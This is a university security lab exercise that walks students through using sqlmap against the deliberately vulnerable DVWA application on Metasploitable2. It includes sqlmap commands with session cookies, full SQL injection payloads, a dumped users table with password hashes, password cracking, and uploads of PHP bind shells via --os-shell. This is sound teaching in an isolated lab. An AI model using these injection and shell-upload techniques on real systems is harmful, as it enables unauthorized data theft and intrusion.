# <img src="https://www.tamusa.edu/brandguide/jpeglogos/tamusa_final_logo_bw1.jpg" width="100" height="50"> SQLi with sqlmap

## sqlmap Overview

sqlmap is an automated open source tool that detects and exploits SQLi vulnerabilities. It supports SQLi against both popular SQL DBMS's (i.e., MySQL, Oracle, Postgresql, MS-SQL and SQLite) and less popular DBMS's (i.e., TiDB, FrontBase, CrateDB and Virtuoso). sqlmap can automate an entire SQLi attack from DBMS detection, SQLi vulnerabilitiy detection, user and database detection, dumping tables, and gaining SQL or  system shells.

Additional sqlmap documentation can be found at [sqlmap.org](https://sqlmap.org/).

This exercise uses DVWA for testing. Ensure you have Metasploitable2 running and can connect to DVWA.

## SQLi Attack using sqlmap

### Challenge 1: Application Authentication and sqlmap

sqlmap supports use of cookies for applications that use session IDs for authentication. DVWA requires user authentication. Using Burp Suite, login to DVWA, browse to the SQL Injection page and enter User ID **1** into form. Click **submit**. A sample GET request from DVWA's SQL Injection page is shown below.

```
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 34.171.165.162:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://34.171.165.162:8000/dvwa/vulnerabilities/sqli/
Cookie: security=low; PHPSESSID=4ae7cff151a35773cb6253368001f1f6
Upgrade-Insecure-Requests: 1

```

The GET request includes two cookies, security=low and PHPSESSID=4ae7cff151a35773cb6253368001f1f6. Access to the page _sqli_ requires authentication. Therefore, the two cookies must be included when running sqlmap against this page. Two techniques can be used. The first technique includes cookies in the sqlmap command with the **--cookie** option. See the example below.

```
sqlmap -u "http://34.171.165.162:8000/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4ae7cff151a35773cb6253368001f1f6"

                                 
        ___
       __H__                                                                            
 ___ ___[)]_____ ___ ___  {1.6.7#stable}                                                
|_ -| . [.]     | .'| . |                                                               
|___|_  [']_|_|_|__,|  _|                                                               
      |_|V...       |_|   https://sqlmap.org                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:41:25 /2022-11-07/

[11:41:25] [INFO] parsing HTTP request from 'dvwa.txt'
[11:41:25] [INFO] resuming back-end DBMS 'mysql' 
[11:41:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 3165=3165#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(2541,9538)>(SELECT COUNT(*),CONCAT(0x7171707171,(SELECT (ELT(2541=2541,1))),0x7176706271,FLOOR(RAND(0)*2))x FROM (SELECT 9918 UNION SELECT 5520 UNION SELECT 6131 UNION SELECT 3426)a GROUP BY x)-- tefw&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6324 FROM (SELECT(SLEEP(5)))Gmex)-- LYhW&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7171707171,0x61434154445452584e58456b4e516d7143734a756b5444616f6f7a486d547779735a6c7479467871,0x7176706271),NULL#&Submit=Submit
---
[11:41:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[11:41:26] [INFO] fetched data logged to text files under '/home/kbarton/.local/share/sqlmap/output/34.171.165.162'                                                             

[*] ending @ 11:41:26 /2022-11-07/
```

**Capture a screenshot of a simple sqlmap attack against DVWA's SQL Injection page with cookies included using --cookie option.**

The second technique is to save the GET request from Burp Suite to a file and read the file into sqlmap. See the folloiwng example. The GET request, with cookies, is stored in dvwa.txt and read into sqlmap using the **-r** option.

```
sqlmap -r dvwa.txt 
        ___
       __H__                                                                            
 ___ ___[(]_____ ___ ___  {1.6.7#stable}                                                
|_ -| . [,]     | .'| . |                                                               
|___|_  ["]_|_|_|__,|  _|                                                               
      |_|V...       |_|   https://sqlmap.org                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:50:08 /2022-11-07/

[11:50:08] [INFO] parsing HTTP request from 'dvwa.txt'
[11:50:08] [INFO] resuming back-end DBMS 'mysql' 
[11:50:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 3165=3165#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(2541,9538)>(SELECT COUNT(*),CONCAT(0x7171707171,(SELECT (ELT(2541=2541,1))),0x7176706271,FLOOR(RAND(0)*2))x FROM (SELECT 9918 UNION SELECT 5520 UNION SELECT 6131 UNION SELECT 3426)a GROUP BY x)-- tefw&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6324 FROM (SELECT(SLEEP(5)))Gmex)-- LYhW&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7171707171,0x61434154445452584e58456b4e516d7143734a756b5444616f6f7a486d547779735a6c7479467871,0x7176706271),NULL#&Submit=Submit
```

### Challenge 2: Dump Tables with sqlmap

sqlmap caches results. Cached results reduce the time to complete successive sqlmap commands when testing an application. However, there are times that using cached results is not desired. The sqlmap cache can be ignored using the option **--fresh-queries**. The option --dump attempts to dump the tables in the current database. The basic techniques used to discover and dump tables are the same techniques used to manually detect and dump tables, but because they are automated, sqlmap is much faster than dumping tables manually.

```
sqlmap -r dvwa.txt --dump

Database: dvwa
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                         | last_name | first_name |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      |
| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+

[18:46:03] [INFO] table 'dvwa.users' dumped to CSV file '/home/kbarton/.local/share/sqlmap/output/34.171.165.162/dump/dvwa/users.csv'                                                                                                                       
[18:46:03] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
[18:46:04] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
Database: dvwa
Table: guestbook
[1 entry]
+------------+------+-------------------------+
| comment_id | name | comment                 |
+------------+------+-------------------------+
| 1          | test | This is a test comment. |
+------------+------+-------------------------+

[18:46:04] [INFO] table 'dvwa.guestbook' dumped to CSV file '/home/kbarton/.local/share/sqlmap/output/34.171.165.162/dump/dvwa/guestbook.csv'                                                                                                               
[18:46:04] [INFO] fetched data logged to text files under '/home/kbarton/.local/share/sqlmap/output/34.171.165.162'

[*] ending @ 18:46:04 /2022-11-07/

```

**Capture a screenshot of the dumped tables.**

### Challenge 3: Password Cracking with sqlmap

You were likely prompted by sqlmap to store and crack hashed passwords. If you followed the prompts and successfully cracked those passwords, skip the next step and proceed to logging in as . If you elected not to crack the passwords, dump the tables again and follow the prompts to crack the passwords.

After successfully cracking the passwords, login with username **pablo**.

**Capture a screenshot of the home page that shows the username is pablo.**

### Challenge 4: sqlmap -> OS Shell

sqlmap will attempt to gain either a SQL or OS shell. Success depends on DBMS and database configuration, but gaining a shell is an important win during penetration testing and amplifies the risk associated with SQLi vulnerabilities. Include the **--os-shell** option to demonstrate gaining an OS shell through DVWA's SQLi vulnerability.

You will be prompted for a specific type of shell. Select PHP (we know that Metasploitable2 includes several PHP-based applications). 

You will also be prompted for directories to attempt to write the shell. Initially, choose:

**[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)**

Note that the attempt to get the os-shell fails. At this point, we are not sure if the limitation is a result of dbms configuration or something to do with the underlying OS.

It is white box testing, so attempt to get an OS shell a second time but use the /tmp directory for the writable directory option. **Before attempting to write the shell to /tmp, examine the content of /tmp. Note any files that are already in /tmp.**

```
root@metasploitable2:/tmp# ls -l
total 8
drwx------ 2 msfadmin msfadmin 4096 Nov  7 06:25 gconfd-msfadmin
drwx------ 2 msfadmin msfadmin 4096 Nov  7 06:25 orbit-msfadmin
```
Use sqlmap again to attempt to get an OS shell, but this time use /tmp/ as the writable directory.

```
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 2
please provide a comma separate list of absolute directory paths: /tmp
[19:54:55] [WARNING] unable to automatically parse any web server path
[19:54:55] [INFO] trying to upload the file stager on '/tmp/' via LIMIT 'LINES TERMINATED BY' method
[19:54:56] [WARNING] unable to upload the file stager on '/tmp/'
[19:54:56] [INFO] trying to upload the file stager on '/tmp/' via UNION method
[19:54:57] [WARNING] expect junk characters inside the file as a leftover from UNION query
[19:55:02] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                                                                                                                            
[19:55:02] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[19:55:03] [INFO] trying to upload the file stager on '/tmp/dvwa/vulnerabilities/sqli/' via LIMIT 'LINES TERMINATED BY' method
[19:55:06] [WARNING] unable to upload the file stager on '/tmp/dvwa/vulnerabilities/sqli/'
[19:55:06] [INFO] trying to upload the file stager on '/tmp/dvwa/vulnerabilities/sqli/' via UNION method
[19:55:07] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[19:55:10] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 14 times
[19:55:10] [INFO] fetched data logged to text files under '/home/kbarton/.local/share/sqlmap/output/34.171.165.162'

[*] ending @ 19:55:10 /2022-11-07/
```
Now, check metasploitable2 to see if anything was written to /tmp.

```
root@metasploitable2:/tmp# ls
gconfd-msfadmin  orbit-msfadmin  tmpuocjv.php  tmpuxssd.php
```
Manual inspection of the two .php files would reveal PHP bind shells. Unfortunately, we cannot browse to the /tmp/ directory but it does demonstrate that sqlmap is able to write a file. Something must explain why we could not write a file to the directories in the webroot. A quick examination of directories in the webroot reveals the likely problem and a possible solution.

```
root@metasploitable2:/var/www# ls -l
total 88
drwxrwxrwt  1 root     root      4096 Nov  3 01:02 dav
drwxr-xr-x  8 www-data www-data  4096 May 20  2012 dvwa
-rw-r--r--  1 www-data www-data   891 May 20  2012 index.php
drwxr-xr-x 10 www-data www-data  4096 May 14  2012 mutillidae
drwxr-xr-x 11 www-data www-data  4096 May 14  2012 phpMyAdmin
-rw-r--r--  1 www-data www-data    19 Apr 16  2010 phpinfo.php
-rw-r--r--  1 root     root        76 Oct 31 17:20 shell.php
drwxr-xr-x  1 www-data www-data  4096 May 14  2012 test
drwxrwxr-x 22 www-data www-data 20480 Apr 19  2010 tikiwiki
drwxrwxr-x 22 www-data www-data 20480 Apr 16  2010 tikiwiki-old
drwxr-xr-x  7 www-data www-data  4096 Apr 16  2010 twiki
```

Some directories from the default writable directory list don't exist (/var/www/html, /var/www/htdocs), and we don't have write permissions to those that exist. However, we see there are directories owned by root where we have write permissions (/var/www/dav) and directories owned by www-data (/var/www/dvwa, /var/www/mutillidae, etc). Attempt directories that exist until you get an OS shell.

**Capture a screenshot of a working shell. Run the id, hostname and ifconfig commands to demonstrate the shell functions.**

